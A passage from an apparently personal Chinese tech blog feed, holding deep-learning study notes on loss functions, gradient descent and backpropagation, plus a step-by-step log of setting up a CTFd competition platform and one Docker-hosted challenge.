title="在“从数据中学习”中"></a>在“从数据中学习”中</h2><ul><li><p>认识了许多概念</p><h3 id="特征量"><a href="#特征量" class="headerlink" title="特征量"></a>特征量</h3></li></ul><blockquote><p>特征量是指可以从输入数据中准确地提取本质数据的转换器，通常表示为向量形式</p></blockquote><p>特征量是由人设计的</p><p>不同问题对应不同特征量</p><p>深度学习中特征量是由机器来学习的</p><h3 id="泛化能力"><a href="#泛化能力" class="headerlink" title="泛化能力"></a>泛化能力</h3><blockquote><p>泛化能力是指处理未被观察过的数据（不包含在训练数据中的数据）的能力</p></blockquote><h3 id="过拟合"><a href="#过拟合" class="headerlink" title="过拟合"></a>过拟合</h3><blockquote><p>只对某个数据集过度拟合的状态称为过拟合</p></blockquote><p>可以理解为训练的模型只对某个数据集起作用</p><h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><blockquote><p>损失函数是表示神经网络性能的“恶劣程度”的指标，即当前的神经网络对监督数据在多大程度上不拟合，在多大程度上不一致</p></blockquote><h3 id="均方误差"><a href="#均方误差" class="headerlink" title="均方误差"></a>均方误差</h3><p>$$<br>E=\frac{1}{2}\Sigma_k(y_k-t_k)^2<br>$$</p><p>这里y_k表示神经网络的输出，t_k表示监督数据，k表示数据维数</p><h3 id="交叉熵误差"><a href="#交叉熵误差" class="headerlink" title="交叉熵误差"></a>交叉熵误差</h3><p>$$<br>E=-\Sigma_kt_k\log{y_k}<br>$$</p><h3 id="损失函数的意义"><a href="#损失函数的意义" class="headerlink" title="损失函数的意义"></a>损失函数的意义</h3><p>个人认为，损失函数存在的意义是作为模型调参结果的重要指标，由于测试精度的变化是不连续的（因为测试数据有限，测试结果的精度就取决于测试数据的多少），故无法体现模型调参后微小的变化，而损失函数是连续的，任何微小的改动都可能改变损失函数的结果（可以认为损失函数的精度比测试结果的精度高得多），故需要损失函数来衡量调参后的结果</p><h3 id="数值微分"><a href="#数值微分" class="headerlink" title="数值微分"></a>数值微分</h3><blockquote><p>利用某个给定的微小值的差分求导数的过程，称为数值微分</p></blockquote><ul><li><p>导数与偏导数的定义</p></li><li><p>梯度及梯度法</p><blockquote><p><strong>梯度法</strong>：函数的取值从当前位置沿着梯度方向前进一段距离，然后在新的地方重新求梯度，再沿着新梯度方向前进，逐渐减小函数值</p></blockquote></li></ul><h3 id="学习算法（随机梯度下降法）的实现"><a href="#学习算法（随机梯度下降法）的实现" class="headerlink" title="学习算法（随机梯度下降法）的实现"></a>学习算法（随机梯度下降法）的实现</h3><p>神经网络的学习步骤：</p><ul><li><p>前提</p><p>神经网络存在合适的权重和偏置，调整权重和偏置以便拟合训练数据的过程称为“学习”</p></li><li><p>步骤1（mini-batch）</p><p>从训练数据中随机选出一部分数据，这部分数据称为mini-batch。我们的目标是减小mini-batch的损失函数的值</p></li><li><p>步骤2（计算梯度）</p><p>为了减小mini-batch的损失函数的值，需要求出各个权重参数的梯度。梯度表示损失函数的值减小最多的方向</p></li><li><p>步骤3（更新参数）</p><p>将权重参数沿梯度方向进行微小更新</p></li><li><p>步骤4（重复）</p><p>重复步骤1、步骤2、步骤3</p></li></ul><blockquote><p><strong>epoch</strong>： epoch是一个单位，一个epoch表示学习中所有训练数据均被使用过一次时的更新次数</p></blockquote><h2 id="误差方向传播法"><a href="#误差方向传播法" class="headerlink" title="误差方向传播法"></a>误差方向传播法</h2><h3 id="计算图"><a href="#计算图" class="headerlink" title="计算图"></a>计算图</h3><p>了解正向传播、反向传播及局部计算的定义</p><h3 id="链式法则"><a href="#链式法则" class="headerlink" title="链式法则"></a>链式法则</h3><p>复合函数导数的定义</p><blockquote><p>如果某个函数由复合函数表示，则该复合函数的导数可以用构成复合函数的各个函数的导数的乘积表示</p></blockquote><p>链式法则是关于复合函数的导数的性质</p><h3 id="反向传播"><a href="#反向传播" class="headerlink" title="反向传播"></a>反向传播</h3><p>反向传播的计算顺序</p><blockquote><p>先将节点的输入信号乘以节点的局部导数（偏导数），然后传递给下一个节点</p></blockquote><ul><li>加法节点的反向传播</li></ul><p>加法节点的反向传播只乘以1</p><ul><li>乘法节点的反向传播</li></ul><p>乘法节点的反向传播会将上游的值乘以正向传播时的输入信号的“翻转值”后传递给下游</p><p>对翻转值的理解：书上说的是“表示一种翻转关系”，个人认为是参与运算的另一个值，以乘法为例：乘法涉及到两个值，则传播到某一个方向的值为上游的值乘以参与运算的另一个对象的值</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFd搭建</title>
      <link href="2021/11/28/ctf_contest_platform_build/"/>
      <url>2021/11/28/ctf_contest_platform_build/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF比赛平台搭建"><a href="#CTF比赛平台搭建" class="headerlink" title="CTF比赛平台搭建"></a>CTF比赛平台搭建</h1><a id="more"></a><h2 id="克隆CTFd"><a href="#克隆CTFd" class="headerlink" title="克隆CTFd"></a>克隆CTFd</h2><p>GitHub：<a href="https://github.com/CTFd/CTFd">https://github.com/CTFd/CTFd</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFd/CTFd.git                                                128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;CTFd&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 14012, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (869/869), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (555/555), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 14012 (delta 480), reused 578 (delta 291), pack-reused 13143</span><br><span class="line">Receiving objects: 100% (14012/14012), 25.84 MiB | 1.69 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (8691/8691), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo apt install docker docker-compose</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ docker --version</span><br><span class="line">Docker version 20.10.8+dfsg1, build 3967b7d</span><br><span class="line">                                                                                                         </span><br><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ docker-compose --version</span><br><span class="line">docker-compose version 1.27.4, build unknown</span><br></pre></td></tr></table></figure><h2 id="添加执行权限"><a href="#添加执行权限" class="headerlink" title="添加执行权限"></a>添加执行权限</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="在CTFd根目录下启动docker"><a href="#在CTFd根目录下启动docker" class="headerlink" title="在CTFd根目录下启动docker"></a>在CTFd根目录下启动docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd]</span><br><span class="line">└─$ sudo docker-compose up -d                                                                      130 ⨯</span><br><span class="line">Creating network <span class="string">&quot;ctfd_internal&quot;</span> with the default driver</span><br><span class="line">Creating network <span class="string">&quot;ctfd_default&quot;</span> with the default driver</span><br><span class="line">Pulling db (mariadb:10.4.12)...</span><br><span class="line">10.4.12: Pulling from library/mariadb</span><br><span class="line">23884877105a: Pull complete</span><br><span class="line">bc38caa0f5b9: Pull complete</span><br><span class="line">2910811b6c42: Pull complete</span><br><span class="line">36505266dcc6: Pull complete</span><br><span class="line">e69dcc78e96e: Pull complete</span><br><span class="line">222f44c5392d: Pull complete</span><br><span class="line">efc64ea97b9c: Pull complete</span><br><span class="line">9912a149de6b: Pull complete</span><br><span class="line">7ef6cf5b5697: Pull complete</span><br><span class="line">8a05be3688e0: Pull complete</span><br><span class="line">c09ffdc1b660: Pull complete</span><br><span class="line">2eb7fe288fc8: Pull complete</span><br><span class="line">b41d1cc4d40f: Pull complete</span><br><span class="line">a92376500910: Pull complete</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>注：首次启动由于下载依赖等会比较慢</p><h2 id="平台配置"><a href="#平台配置" class="headerlink" title="平台配置"></a>平台配置</h2><p>打开浏览器，输入127.0.0.1:8000配置赛事相关信息</p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" srcset="data:image/png;base64,666" alt="GFgMuY.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" srcset="data:image/png;base64,666" alt="GFgTJ9.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" srcset="data:image/png;base64,666" alt="GFgWcX.png"></p><h2 id="添加题目"><a href="#添加题目" class="headerlink" title="添加题目"></a>添加题目</h2><p>在GitHub上找题目，clone到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/CTFTraining.git</span><br><span class="line">Cloning into <span class="string">&#x27;CTFTraining&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 86, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86</span><br><span class="line">Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (48/48), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>实际测试发现不能把所有的题目都clone下来，就先试一道题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 32, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32</span><br><span class="line">Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (3/3), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>docker images 命令查看已有镜像</p><p>docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker build ./ -t 0ctf_2016_unserialize                     </span><br><span class="line">Sending build context to Docker daemon  1.841MB</span><br><span class="line">Step 1/8 : FROM php:5.6-fpm-alpine</span><br><span class="line">5.6-fpm-alpine: Pulling from library/php</span><br><span class="line">169185f82c45: Pull complete </span><br><span class="line">8ba0d98519aa: Pull complete </span><br><span class="line">75f762bbc102: Pull complete </span><br><span class="line">04f939cd9fe5: Pull complete </span><br><span class="line">5feedbe48aa1: Pull complete </span><br><span class="line">47e0f87348c0: Pull complete </span><br><span class="line">68b7fb9d3c14: Pull complete </span><br><span class="line">7e4b086d6b5d: Pull complete </span><br><span class="line">a15e624700d4: Pull complete </span><br><span class="line">f714654cc532: Pull complete </span><br><span class="line">Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker images                                                                                                                                                        1 ⨯</span><br><span class="line">REPOSITORY              TAG               IMAGE ID       CREATED          SIZE</span><br><span class="line">0ctf_2016_unserialize   latest            931233916db0   2 minutes ago    333MB</span><br><span class="line">ctfd_ctfd               latest            b36ee26f2439   49 minutes ago   791MB</span><br><span class="line">python                  3.7-slim-buster   cd7d26aa86ac   10 days ago      113MB</span><br><span class="line">nginx                   1.17              9beeba249f3e   18 months ago    127MB</span><br><span class="line">mariadb                 10.4.12           b6184b68d1fd   19 months ago    357MB</span><br><span class="line">redis                   4                 191c4017dcdd   19 months ago    89.3MB</span><br><span class="line">ubuntu                  18.10             9dc19675e327   2 years ago      67.3MB</span><br><span class="line">php                     5.6-fpm-alpine    6feac8f2ef42   2 years ago      54.5MB</span><br><span class="line">php                     5-apache-jessie   d34f09f63596   2 years ago      374MB</span><br></pre></td></tr></table></figure><p>再通过镜像创建容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize</span><br></pre></td></tr></table></figure><p>查看现有容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker ps                                                                   </span><br><span class="line">CONTAINER ID   IMAGE                   COMMAND                  CREATED          STATUS          PORTS                                               NAMES</span><br><span class="line">9cae78cf79bc   0ctf_2016_unserialize   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   5 seconds ago    Up 4 seconds    9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp   0ctf_2016_unserialize</span><br><span class="line">3b3889db12c7   nginx:1.17              <span class="string">&quot;nginx -g &#x27;daemon of…&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                   ctfd_nginx_1</span><br><span class="line">7b58b9661715   ctfd_ctfd               <span class="string">&quot;/opt/CTFd/docker-en…&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp           ctfd_ctfd_1</span><br><span class="line">93e49564bff7   mariadb:10.4.12         <span class="string">&quot;docker-entrypoint.s…&quot;</span>   57 minutes ago   Up 57 minutes                                                       ctfd_db_1</span><br><span class="line">9f4380eb4639   redis:4                 <span class="string">&quot;docker-entrypoint.s…&quot;</span>   57 minutes ago   Up 57 minutes</span><br></pre></td></tr></table></figure><p>访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口</p><p><a href="https://www.helloimg.com/image/GFrlx9"><img src="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" srcset="data:image/png;base64,666" alt="GFrlx9.png"></a></p><p>打开题目容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t &lt;container&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>为题目添加flag：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker <span class="built_in">exec</span> -i -t 0ctf_2016_unserialize /bin/sh                                                                                                                      1 ⨯</span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br><span class="line">/var/www/html <span class="comment"># echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt</span></span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    flag.txt      index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br></pre></td></tr></table></figure><p>最后在后台添加题目地址等信息<br><img src="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" srcset="data:image/png;base64,666" alt="GFVPrX.png"><br><img src="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" srcset="data:image/png;base64,666" alt="GFVFO9.png"></p><p><a href="https://www.helloimg.com/image/GFVxLn"><img src="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" srcset="data:image/png;base64,666" alt="GFVxLn.png"></a></p><p>同理可添加其他题目</p><h2 id="搭建中遇到的问题"><a href="#搭建中遇到的问题" class="headerlink" title="搭建中遇到的问题"></a>搭建中遇到的问题</h2><ul><li>git clone 命令克隆失败：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;</span>: Failed to connect to github.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p>由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来</p><ul><li><p>有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]</span><br><span class="line">└─$ sudo docker build ./ -t urlstorage                                                                                                                                        1 ⨯</span><br><span class="line">Sending build context to Docker daemon  282.6kB</span><br><span class="line">Step 1/7 : FROM ubuntu:18.10</span><br><span class="line">18.10: Pulling from library/ubuntu</span><br><span class="line">8a532469799e: Pull complete </span><br><span class="line">32f4dcec3531: Pull complete </span><br><span class="line">230f0701585e: Pull complete </span><br><span class="line">e01f70622967: Pull complete </span><br><span class="line">Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686c</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:18.10</span><br><span class="line"> ---&gt; 9dc19675e327</span><br><span class="line">Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=<span class="string">&quot;2.1.1&quot;</span></span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 98e854ac92f3</span><br><span class="line">Removing intermediate container 98e854ac92f3</span><br><span class="line"> ---&gt; 154a521cb653</span><br><span class="line">Step 3/7 : RUN sed -i <span class="string">&#x27;s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g&#x27;</span> /etc/apt/sources.list &amp;&amp;     sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 8d702a730242</span><br><span class="line">Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InRelease</span><br><span class="line">Ign:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InRelease</span><br><span class="line">Ign:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InRelease</span><br><span class="line">Err:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Reading package lists...</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27;</span> does not have a Release file.</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27;</span> does not have a Release file.                                                               </span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27;</span> does not have a Release file.                                                             </span><br><span class="line">The <span class="built_in">command</span> <span class="string">&#x27;/bin/sh -c sed -i &#x27;</span>s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     sed -i &#x27;</span>/security/d<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27;</span> returned a non-zero code: 100</span><br></pre></td></tr></table></figure></li><li><p>许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch</title>
      <link href="2021/11/28/deep_learning_from_scratch/"/>
      <url>2021/11/28/deep_learning_from_scratch/</url>
      
        <content type="html"><![CDATA[<h1 id="读书记录"><a href="#读书记录" class="headerlink" title="读书记录"></a>读书记录</h1><a id="more"></a><h2 id="收获："><a href="#收获：" class="headerlink" title="收获："></a>收获：</h2><ul><li><p>对matplotlib、numpy有了初步认识</p></li><li><p>了解了一些基础概念</p></li><li><p>跟随书本实现了简单的逻辑门电路</p></li><li><p>认识了感知机、激活函数</p></li></ul><h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy:"></a>numpy:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array([<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>]) <span class="comment">#生成数组</span></span><br><span class="line">print(x)</span><br><span class="line">print(x.dtype)<span class="comment">#查看数据类型</span></span><br><span class="line">print(x.shape)<span class="comment">#查看矩阵形状</span></span><br><span class="line">x = x.flatten()<span class="comment">#将矩阵转换为一维数组</span></span><br></pre></td></tr></table></figure><h3 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.image <span class="keyword">import</span> imread</span><br><span class="line"></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">y = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line">plt.plot(x, y)<span class="comment">#绘制图形</span></span><br><span class="line">plt.show()<span class="comment">#显示坐标系</span></span><br><span class="line"></span><br><span class="line">img = imread(<span class="string">&quot;lena.png&quot;</span>)</span><br><span class="line">plt.imshow(img)<span class="comment">#显示图像</span></span><br></pre></td></tr></table></figure><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul>    <li>广播：将与矩阵相乘的标量转换为相应大小矩阵的功能</li>    <li>张量：一般化之后的向量或矩阵</li>    <li>感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。</li></ul><h3 id="简单逻辑门的实现"><a href="#简单逻辑门的实现" class="headerlink" 